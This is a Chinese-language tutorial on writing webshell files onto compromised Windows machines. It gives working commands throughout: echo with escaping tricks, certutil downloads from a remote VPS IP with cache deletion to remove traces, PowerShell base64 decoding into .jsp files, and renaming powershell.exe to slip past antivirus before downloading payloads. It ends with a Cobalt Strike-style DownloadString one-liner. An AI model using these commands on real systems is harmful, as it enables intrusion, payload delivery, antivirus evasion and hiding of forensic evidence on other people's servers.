windows篇

一.echo直接写

Tip：windows中echo内容不需加""

使用简单粗暴：

echo hellow > F:/Download/1.jsp
使用限制点：
1.echo字符数量有限，个别一句话太长，无法一次性写入。
2.windows涉及系统特殊符号转码问题，如小尖括号得换成对应的：
<  替换成  ^<     >   替换成  ^>
/   替换成  ^/       +  替换成  ^+
另外因涉及web服务，可能对导致内容进行URL编码，也会导致写入错误，所以也需要将相应字符进行转码：
% --> %25    # --> %23    @ --> %40
+ --> %2b     | --> %7c     & --> ^%26

二.certutil

2.1 Certutil解码写入

certutil是windows自带的命令行程序（常用于base64编码解码、hash、互联网下载等），
其是一个 CLI 程序，也用于转储和显示证书颁发机构（CA），配置信息，证书服务， CA 组件的备份和还原以及验证证书、密钥对和证书链，它作为证书服务的一部分安装 ，使用certutil下载文件都会留下缓存，危！so记得一堆操作后对缓存进行删除。

Tips：

默认缓存目录为："%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content"

删除缓存命令：

certutil.exe -urlcache -split -f  http://39.107.41.90:8000/123.jsp delete
因为编码以及字符数限制有时候直接echo+内容会可能出错，可先将一句话内容进行base64编码，将base64编码内容写入文件，然后利用certutil进行base64解码。具体用法：

certutil & certutil -urlcache -split -f http://39.107.41.90:8000/certutil.exe form.execertutil | certutil -urlcache -split -f http://39.107.41.90:8000/certutil.exe form.exe

form.exe -decode 123.txt  F:\Download\123.jsp

三.poweshell

3.1 base64编码写入

将一句话进行base64编码，替换data部分，执行（进行base64解码并保存到特定位置）

Powershell $data = 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data)) >F:\Download/test7.txt

3.2 powershell远程下载

Tips：直接下载脚本文件，会被拦截，个别杀软同时会检测powershell名称，可尝试将powershell复制到特定目录并重命名或者远程vps下载一个，再利用；可先下载txt文件，再利用powershell进行解码。

步骤1：复制powershell至特定目录并重命名

copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe form.txt

步骤2：执行下载vps经base64加密的txt文件并保存（明确机器出网情况）

form.txt (new-object Net.WebClient).DownloadFile('http://39.107.41.90:8001/123.txt','F:\Download\123.txt')

步骤3：利用powershell进行base64解码并保存为脚本文件

form.txt $data = Get-Content "F:\Download\123.txt";[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data)) >F:\Download\1234.jsp
小拓展：

打印远程文件到控制台（打印文件内容），是不是看着眼熟：CS-web投递：

powershell -c (New-Object Net.WebClient).DownloadString('http://39.107.41.90:8001/123.txt')
